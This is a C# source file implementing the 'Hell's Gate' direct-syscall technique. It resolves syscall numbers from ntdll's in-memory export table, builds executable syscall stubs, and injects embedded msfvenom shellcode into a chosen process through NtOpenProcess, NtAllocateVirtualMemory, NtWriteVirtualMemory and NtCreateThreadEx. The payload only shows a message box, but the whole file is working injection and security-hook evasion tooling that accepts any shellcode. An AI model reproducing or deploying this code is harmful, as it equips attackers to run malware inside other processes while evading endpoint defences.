using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

using static HellsGate.Delegates;
using static HellsGate.Win32;



namespace HellsGate
{
    class Program
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern IntPtr VirtualAlloc(IntPtr baseAddress, uint size, MemoryAllocationFlags allocationType, MemoryProtectionFlags protection);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hHandle);
        [Flags]
        internal enum MemoryAllocationFlags
        {
            Commit = 0x01000,
            Reserve = 0x02000
        }
        [Flags]
        internal enum MemoryProtectionFlags
        {
            ExecuteReadWrite = 0x040,
        }

        public static IntPtr get_image_export_directory(IntPtr handle)
        {
            IMAGE_DOS_HEADER dosheader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(handle, typeof(IMAGE_DOS_HEADER));

            IntPtr IMAGE_NT_HEADERS64_addr = IntPtr.Add(handle, (int)dosheader.e_lfanew);

            IMAGE_NT_HEADERS64 image_nt_header = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(IMAGE_NT_HEADERS64_addr,typeof(IMAGE_NT_HEADERS64));

            IMAGE_DATA_DIRECTORY image_data_directory_exp_table = image_nt_header.OptionalHeader.ExportTable;

            IntPtr IMAGE_EXPORT_DIRECTORY_addr = (IntPtr)(handle.ToInt64() + (int)image_data_directory_exp_table.VirtualAddress);
            

            return IMAGE_EXPORT_DIRECTORY_addr;
        }

        public static int getsyscallnumber(IntPtr BaseAddress, IntPtr ExportDirectoryAddress, string FunctionName)
        {
            IMAGE_EXPORT_DIRECTORY IMAGE_EXPORT_DIRECTORY_instance = (IMAGE_EXPORT_DIRECTORY) Marshal.PtrToStructure(ExportDirectoryAddress, typeof(IMAGE_EXPORT_DIRECTORY));
                

            IntPtr AddressOfFunctions = (IntPtr)(BaseAddress.ToInt64() + IMAGE_EXPORT_DIRECTORY_instance.AddressOfFunctions);
            IntPtr AddressOfNameOrdinals = (IntPtr)(BaseAddress.ToInt64() + IMAGE_EXPORT_DIRECTORY_instance.AddressOfNameOrdinals);
            IntPtr AddressOfNames = (IntPtr)(BaseAddress.ToInt64() + IMAGE_EXPORT_DIRECTORY_instance.AddressOfNames);

            UInt32 NumberOfNames = IMAGE_EXPORT_DIRECTORY_instance.NumberOfNames;

            for (int iterate_num = 0; iterate_num < NumberOfNames; iterate_num++)
            {
                UInt32 RVA_AddressOfNames_single = (UInt32)Marshal.ReadInt32(AddressOfNames, 4 * iterate_num);
                string FuncName_temp = Marshal.PtrToStringAnsi((IntPtr)(BaseAddress.ToInt64() + RVA_AddressOfNames_single));

                if (FuncName_temp.ToLower() == FunctionName.ToLower())
                {
                    UInt16 RVA_AddressOfNameOrdinals_single = (UInt16)Marshal.ReadInt16(AddressOfNameOrdinals, 2 * iterate_num);
                    UInt32 RVA_AddressOfFunctions_single = (UInt32)Marshal.ReadInt32(AddressOfFunctions, 4 * RVA_AddressOfNameOrdinals_single);
                    IntPtr REAL_Func_Address = (IntPtr)(BaseAddress.ToInt64() + RVA_AddressOfFunctions_single);
                    IntPtr FunctionAddress = REAL_Func_Address;

                    byte[] syscallstub = new byte[11];

                    for (int i = 0; i < 11; i++)
                    {
                        syscallstub[i] = Marshal.ReadByte(REAL_Func_Address + i*sizeof(byte));
                    }

                    string syscall_stub_string = ByteArrayToHexStringViaStringConcatArrayConvertAll(syscallstub);
                    
                    int syscall_number = 0;

                    if (syscallstub[0] == 0xe9 || syscallstub[3] == 0xe9)
                    {
                        //Halo's gate implementation later
                    }
                    else
                    {
                        syscall_number = (syscallstub[5] << 8) | (syscallstub[4]);
                        Console.WriteLine("[+] Function Name: " + FuncName_temp + " || Resolved Sycall no: " + syscall_number.ToString("X"));
                        return syscall_number;
                    }                     
                }
            }
            return 0;
        }

        static string ByteArrayToHexStringViaStringConcatArrayConvertAll(byte[] bytes)
        {
            return string.Concat(Array.ConvertAll(bytes, b => b.ToString("X2")));
        }

        public static IntPtr get_syscall_stub(int syscall_number) {

            byte[] syscall_copy = syscall;
            syscall_copy[5] = (byte) ((syscall_number >>8) & 0xff);
            syscall_copy[4] = (byte)(syscall_number & 0xff);

            string actual_syscall = ByteArrayToHexStringViaStringConcatArrayConvertAll(syscall_copy);
            

            IntPtr buffer = VirtualAlloc(IntPtr.Zero, (uint)syscall_copy.Length, MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve, MemoryProtectionFlags.ExecuteReadWrite);
            
            Marshal.Copy(syscall_copy, 0, buffer, syscall_copy.Length);

            return buffer;        
        }


        static void Main(string[] args)
        {
            //msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Hello from Hells gate" -f csharp EXITFUNC=thread
            byte[] shellcode = new byte[331] {
0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,0x01,0x00,0x00,0x3e,0x4c,0x8d,
0x85,0x33,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x48,0x65,0x6c,0x6c,0x6f,
0x20,0x66,0x72,0x6f,0x6d,0x20,0x48,0x65,0x6c,0x6c,0x73,0x20,0x67,0x61,0x74,
0x65,0x20,0x3a,0x29,0x00,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,
0x00 };


            IntPtr alloc_size = new IntPtr(Convert.ToUInt32(shellcode.Length));

            int processid = int.Parse(args[0]);

            Process npProc = Process.GetProcessById(processid);

            IntPtr handle = GetModuleHandle("ntdll.dll");
            if (handle == IntPtr.Zero)
            {
                Console.WriteLine("Unable to open handle to ntdll");
                return;
            }

            IntPtr export_directory_addr = get_image_export_directory(handle);

            IntPtr addr = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;
            
            CLIENT_ID ci = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)npProc.Id
            };
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            UInt32 outSize = 0;
            IntPtr threadHandle = new IntPtr();

            int NtOpenProcess_syscall_number = getsyscallnumber(handle, export_directory_addr, "NtOpenProcess");
            Delegates.NtOpenProcess NtOpenProcess = (Delegates.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(get_syscall_stub(NtOpenProcess_syscall_number), typeof(Delegates.NtOpenProcess));
            NtOpenProcess(ref hProcess, 0x001F0FFF, ref oa, ref ci);
            Console.WriteLine("[+] Handle to process: " + hProcess.ToString("X"));

            int NtAllocateVirtualMemory_syscall_number = getsyscallnumber(handle, export_directory_addr, "NtAllocateVirtualMemory");
            Delegates.NtAllocateVirtualMemory NtAllocateVirtualMemory = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(get_syscall_stub(NtAllocateVirtualMemory_syscall_number), typeof(Delegates.NtAllocateVirtualMemory));
            NtAllocateVirtualMemory(hProcess, ref addr, 0, ref alloc_size, (int) (AllocationType.Commit | AllocationType.Reserve), (int)MemoryProtection.ExecuteReadWrite);
            Console.WriteLine("[+] Pointer to the allocated buffer: " + addr.ToString("X"));

            int NtWriteVirtualMemory_syscall_number = getsyscallnumber(handle, export_directory_addr, "NtWriteVirtualMemory");
            Delegates.NtWriteVirtualMemory NtWriteVirtualMemory = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(get_syscall_stub(NtWriteVirtualMemory_syscall_number), typeof(Delegates.NtWriteVirtualMemory));
            NtWriteVirtualMemory(hProcess, addr, shellcode, (uint)shellcode.Length, ref outSize);
            Console.WriteLine("[+] No of bytes written: " + outSize.ToString("X"));

            int NtCreateThreadEx_syscall_number = getsyscallnumber(handle, export_directory_addr, "NtCreateThreadEx");
            Delegates.NtCreateThreadEx NtCreateThreadEx = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(get_syscall_stub(NtCreateThreadEx_syscall_number), typeof(Delegates.NtCreateThreadEx));
            NtCreateThreadEx(ref threadHandle, 0x0000FFFF | 0x001F0000, IntPtr.Zero, hProcess, addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            Console.WriteLine("[+] Newly created thread handle: " + threadHandle.ToString("X"));

        }
    }
}
